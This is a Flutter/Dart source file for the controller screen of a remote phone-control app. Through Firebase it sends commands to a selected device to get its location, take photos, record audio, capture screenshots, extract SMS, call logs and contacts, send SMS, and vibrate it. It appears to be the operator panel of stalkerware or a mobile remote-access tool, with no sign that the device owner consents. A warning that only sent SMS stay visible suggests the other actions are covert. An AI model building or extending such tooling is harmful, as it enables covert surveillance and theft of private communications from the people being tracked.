import 'package:flutter/material.dart';
  import 'package:firebase_auth/firebase_auth.dart';
  import 'package:firebase_database/firebase_database.dart';

  class RemoteControlScreen extends StatefulWidget {
    const RemoteControlScreen({super.key});

    @override
    _RemoteControlScreenState createState() => _RemoteControlScreenState();
  }

  class _RemoteControlScreenState extends State<RemoteControlScreen> {
    final DatabaseReference _databaseRef = FirebaseDatabase.instance.ref();
    final FirebaseAuth _auth = FirebaseAuth.instance;
    String? _userId;
    String? _selectedPhoneModel;
    List<String> _phoneModels = [];
    bool _isLoading = true;
    String? _selectedDataCount = '15'; // Default number of records
    String camera = 'rear'; // Move camera variable here
    bool useFlash = false; // Move useFlash variable here
    String? _selectedVibrateDuration = '5'; // Default vibrate duration
    String? _selectedAudioDuration = '2'; // Default audio recording duration

    @override
    void initState() {
      super.initState();
      _initializeUser();
    }

    Future<void> _initializeUser() async {
      setState(() {
        _isLoading = true;
      });

      try {
        final user = _auth.currentUser;
        if (user != null) {
          _userId = user.uid;
          await _fetchDevices();
        } else {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(content: Text('User not logged in!')),
          );
        }
      } catch (e) {
        debugPrint('Error initializing user: $e');
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Failed to fetch user data.')),
        );
      } finally {
        setState(() {
          _isLoading = false;
        });
      }
    }

    Future<void> _fetchDevices() async {
      if (_userId == null) return;

      try {
        final phonesSnapshot =
            await _databaseRef.child('users/$_userId/phones').get();
        if (phonesSnapshot.exists) {
          _phoneModels = phonesSnapshot.children.map((e) => e.key!).toList();
          setState(() {
            _selectedPhoneModel =
                _phoneModels.isNotEmpty ? _phoneModels.first : null;
          });
        }
        // Ensure default values exist in the dropdown items
        if (!_phoneModels.contains(_selectedPhoneModel)) {
          _selectedPhoneModel =
              _phoneModels.isNotEmpty ? _phoneModels.first : null;
        }
        if (!['15', '30', '50', '100'].contains(_selectedDataCount)) {
          _selectedDataCount = '15';
        }
        if (!['1', '2', '5', '10'].contains(_selectedAudioDuration)) {
          _selectedAudioDuration = '2';
        }
        if (!['5', '10', '15', '30'].contains(_selectedVibrateDuration)) {
          _selectedVibrateDuration = '5';
        }
      } catch (e) {
        debugPrint('Error fetching devices: $e');
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Error loading devices.')),
        );
      }
    }

    Future<void> _sendCommand(String command, Map<String, dynamic> data) async {
      if (_userId == null || _selectedPhoneModel == null) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Please select a device.')),
        );
        return;
      }

      try {
        final timestamp = DateTime.now().millisecondsSinceEpoch.toString();
        final today = DateTime.now();
        final dateKey = '${today.year}-${today.month}-${today.day}';

        // Convert params to Map<String, String>
        Map<String, String> params = data.map((key, value) {
          return MapEntry(key, value.toString());
        });

        await _databaseRef
            .child(
                'users/$_userId/phones/$_selectedPhoneModel/commands/$dateKey/$timestamp')
            .set({
          'command': command,
          'params': params, // Send as Map<String, String>
          'status': 'pending',
        });

        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Command sent successfully!')),
        );
      } catch (e) {
        debugPrint('Error sending command: $e');
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Failed to send command.')),
        );
      }
    }

    Widget _buildFeatureCard({
      required String title,
      required String subtitle,
      required IconData icon,
      required Widget child,
      Color? iconColor,
    }) {
      return Container(
        margin: const EdgeInsets.only(bottom: 16),
        decoration: BoxDecoration(
          color: Colors.white,
          borderRadius: BorderRadius.circular(16),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.05),
              blurRadius: 10,
              offset: const Offset(0, 4),
            ),
          ],
        ),
        child: ExpansionTile(
          leading: Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: (iconColor ?? Colors.blue).withOpacity(0.1),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(icon, color: iconColor ?? Colors.blue),
          ),
          title: Text(
            title,
            style: const TextStyle(
              fontWeight: FontWeight.w600,
              fontSize: 16,
            ),
          ),
          subtitle: Text(
            subtitle,
            style: TextStyle(
              color: Colors.grey[600],
              fontSize: 13,
            ),
          ),
          children: [
            Padding(
              padding: const EdgeInsets.all(16),
              child: child,
            ),
          ],
        ),
      );
    }

    Widget _buildDeviceSelector() {
      return Container(
        margin: const EdgeInsets.symmetric(vertical: 16),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: Colors.blue.withOpacity(0.1),
          borderRadius: BorderRadius.circular(16),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              'Selected Device',
              style: TextStyle(
                fontWeight: FontWeight.w600,
                fontSize: 14,
                color: Colors.blue,
              ),
            ),
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12),
              decoration: BoxDecoration(
                color: Colors.white,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.blue.withOpacity(0.3)),
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  value: _selectedPhoneModel,
                  isExpanded: true,
                  hint: const Text('Select a device'),
                  icon: const Icon(Icons.phone_android),
                  items: _phoneModels.map((model) {
                    return DropdownMenuItem(
                      value: model,
                      child: Text(model),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() {
                      _selectedPhoneModel = value;
                    });
                  },
                ),
              ),
            ),
          ],
        ),
      );
    }

    Widget _buildModernButton({
      required VoidCallback onPressed,
      required String label,
      required IconData icon,
      Color? color,
    }) {
      return ElevatedButton(
        onPressed: onPressed,
        style: ElevatedButton.styleFrom(
          backgroundColor: color ?? Colors.blue,
          foregroundColor: Colors.white,
          padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(12),
          ),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, size: 20),
            const SizedBox(width: 8),
            Text(label),
          ],
        ),
      );
    }

    Widget _buildModernTextField({
      required String label,
      required TextEditingController controller,
      required TextInputType keyboardType,
      String? hintText,
    }) {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            label,
            style: const TextStyle(
              fontWeight: FontWeight.w500,
              fontSize: 14,
            ),
          ),
          const SizedBox(height: 8),
          TextField(
            controller: controller,
            keyboardType: keyboardType,
            decoration: InputDecoration(
              hintText: hintText,
              filled: true,
              fillColor: Colors.grey[100],
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(12),
                borderSide: BorderSide.none,
              ),
              contentPadding: const EdgeInsets.symmetric(
                horizontal: 16,
                vertical: 12,
              ),
            ),
          ),
        ],
      );
    }

    Widget _buildTakePictureSection() {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Expanded(
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.grey[100],
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Row(
                    children: [
                      Radio(
                        value: 'front',
                        groupValue: camera,
                        onChanged: (value) {
                          setState(() {
                            camera = value.toString();
                          });
                        },
                      ),
                      const Text('Front Camera'),
                      const SizedBox(width: 16),
                      Radio(
                        value: 'rear',
                        groupValue: camera,
                        onChanged: (value) {
                          setState(() {
                            camera = value.toString();
                          });
                        },
                      ),
                      const Text('Rear Camera'),
                    ],
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
            decoration: BoxDecoration(
              color: Colors.grey[100],
              borderRadius: BorderRadius.circular(12),
            ),
            child: Row(
              children: [
                Checkbox(
                  value: useFlash,
                  onChanged: (value) {
                    setState(() {
                      useFlash = value!;
                    });
                  },
                ),
                const Text('Use Flash'),
              ],
            ),
          ),
          const SizedBox(height: 16),
          _buildModernButton(
            onPressed: () => _sendCommand('take_picture', {
              'camera': camera,
              'use_flash': useFlash,
            }),
            label: 'Capture Photo',
            icon: Icons.camera,
          ),
        ],
      );
    }

    Widget _buildRecoverDataSection() {
      final TextEditingController phoneController = TextEditingController();

      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text('Number of Data Records:'),
          DropdownButton<String>(
            value: _selectedDataCount,
            isExpanded: true,
            items: <String>['15', '30', '50', '100']
                .map((dataCount) => DropdownMenuItem<String>(
                      value: dataCount,
                      child: Text(dataCount),
                    ))
                .toList(),
            onChanged: (value) {
              setState(() {
                _selectedDataCount = value;
              });
            },
          ),
          const SizedBox(height: 16),
          const Text('Phone Number (Optional):'),
          Opacity(
            opacity: 0.5,
            child: TextField(
              controller: phoneController,
              keyboardType: TextInputType.phone,
              decoration: const InputDecoration(hintText: 'Enter phone number'),
            ),
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              _buildModernButton(
                onPressed: () => _sendCommand('recover_sms', {
                  'phone_number': phoneController.text.trim().isEmpty
                      ? 'unknown'
                      : phoneController.text.trim(),
                  'data_count': _selectedDataCount,
                }),
                label: 'Recover SMS',
                icon: Icons.sms,
              ),
              const SizedBox(width: 16),
              _buildModernButton(
                onPressed: () => _sendCommand('recover_calls', {
                  'phone_number': phoneController.text.trim().isEmpty
                      ? 'unknown'
                      : phoneController.text.trim(),
                  'data_count': _selectedDataCount,
                }),
                label: 'Recover Calls',
                icon: Icons.call,
              ),
            ],
          ),
        ],
      );
    }

    Widget _buildRecordAudioSection() {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text('Audio Recording Duration (minutes):'),
          DropdownButton<String>(
            value: _selectedAudioDuration,
            isExpanded: true,
            items: <String>['1', '2', '5', '10']
                .map((duration) => DropdownMenuItem<String>(
                      value: duration,
                      child: Text(duration),
                    ))
                .toList(),
            onChanged: (value) {
              setState(() {
                _selectedAudioDuration = value;
              });
            },
          ),
          const SizedBox(height: 16),
          _buildModernButton(
            onPressed: () => _sendCommand('record_audio', {
              'duration': _selectedAudioDuration,
            }),
            label: 'Record Audio',
            icon: Icons.mic,
          ),
        ],
      );
    }

    Widget _buildRetrieveContactsSection() {
      return _buildModernButton(
        onPressed: () => _sendCommand('retrieve_contacts', {}),
        label: 'Retrieve Contacts',
        icon: Icons.contacts,
      );
    }

    Widget _buildSendSmsSection() {
      final TextEditingController phoneController = TextEditingController();
      final TextEditingController messageController = TextEditingController();

      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            'Send SMS',
            style: TextStyle(
              fontWeight: FontWeight.bold,
              fontSize: 18,
            ),
          ),
          const SizedBox(height: 8),
          const Text(
            'Warning: The SMS will be visible in the SMS app.',
            style: TextStyle(
              color: Colors.red,
              fontSize: 14,
            ),
          ),
          const SizedBox(height: 16),
          _buildModernTextField(
            label: 'Phone Number',
            controller: phoneController,
            keyboardType: TextInputType.phone,
            hintText: 'Enter phone number',
          ),
          const SizedBox(height: 16),
          _buildModernTextField(
            label: 'Message',
            controller: messageController,
            keyboardType: TextInputType.text,
            hintText: 'Enter message',
          ),
          const SizedBox(height: 16),
          _buildModernButton(
            onPressed: () {
              if (phoneController.text.trim().isEmpty ||
                  messageController.text.trim().isEmpty) {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('Both fields are required.')),
                );
                return;
              }
              _sendCommand('send_sms', {
                'phone_number': phoneController.text.trim(),
                'message': messageController.text.trim(),
              });
            },
            label: 'Send SMS',
            icon: Icons.send,
          ),
        ],
      );
    }

    Widget _buildVibrateSection() {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text('Vibrate Duration (seconds):'),
          DropdownButton<String>(
            value: _selectedVibrateDuration,
            isExpanded: true,
            items: <String>['5', '10', '15', '30']
                .map((duration) => DropdownMenuItem<String>(
                      value: duration,
                      child: Text(duration),
                    ))
                .toList(),
            onChanged: (value) {
              setState(() {
                _selectedVibrateDuration = value;
              });
            },
          ),
          const SizedBox(height: 16),
          _buildModernButton(
            onPressed: () => _sendCommand('vibrate', {
              'duration': _selectedVibrateDuration,
            }),
            label: 'Vibrate',
            icon: Icons.vibration,
          ),
        ],
      );
    }

    Widget _buildScreenshotSection() {
      return _buildModernButton(
        onPressed: () => _sendCommand('take_screenshot', {}),
        label: 'Take Screenshot',
        icon: Icons.screenshot,
      );
    }

    @override
    Widget build(BuildContext context) {
      return Scaffold(
        appBar: AppBar(
          elevation: 0,
          title: const Text('Remote Control'),
          centerTitle: true,
          backgroundColor: Colors.white,
          foregroundColor: Colors.black,
        ),
        backgroundColor: Colors.grey[50],
        body: _isLoading
            ? const Center(child: CircularProgressIndicator())
            : SafeArea(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(16),
                  child: Column(
                    children: [
                      if (_phoneModels.isNotEmpty) _buildDeviceSelector(),
                      _buildFeatureCard(
                        title: 'Location Tracking',
                        subtitle: 'Get current device location',
                        icon: Icons.location_on,
                        iconColor: Colors.red,
                        child: _buildModernButton(
                          onPressed: () => _sendCommand('get_location', {}),
                          label: 'Get Location',
                          icon: Icons.my_location,
                        ),
                      ),
                      _buildFeatureCard(
                        title: 'Camera Control',
                        subtitle: 'Take photos using device camera',
                        icon: Icons.camera_alt,
                        iconColor: Colors.green,
                        child: _buildTakePictureSection(),
                      ),
                      _buildFeatureCard(
                        title: 'Record Audio',
                        subtitle: 'Record audio using device microphone',
                        icon: Icons.mic,
                        iconColor: Colors.purple,
                        child: _buildRecordAudioSection(),
                      ),
                      _buildFeatureCard(
                        title: 'Take Screenshot',
                        subtitle: 'Capture a screenshot of the device',
                        icon: Icons.screenshot,
                        iconColor: Colors.brown,
                        child: _buildScreenshotSection(),
                      ),
                      _buildFeatureCard(
                        title: 'Recover Data',
                        subtitle: 'Recover SMS and call logs',
                        icon: Icons.storage,
                        iconColor: Colors.orange,
                        child: _buildRecoverDataSection(),
                      ),
                      _buildFeatureCard(
                        title: 'Retrieve Contacts',
                        subtitle: 'Retrieve list of contacts',
                        icon: Icons.contacts,
                        iconColor: Colors.blue,
                        child: _buildRetrieveContactsSection(),
                      ),
                      _buildFeatureCard(
                        title: 'Send SMS',
                        subtitle: 'Send SMS to a phone number',
                        icon: Icons.message,
                        iconColor: Colors.teal,
                        child: _buildSendSmsSection(),
                      ),
                      _buildFeatureCard(
                        title: 'Vibrate the Phone',
                        subtitle: 'Vibrate the phone for a specified duration',
                        icon: Icons.vibration,
                        iconColor: Colors.pink,
                        child: _buildVibrateSection(),
                      ),
                    ],
                  ),
                ),
              ),
      );
    }
  }
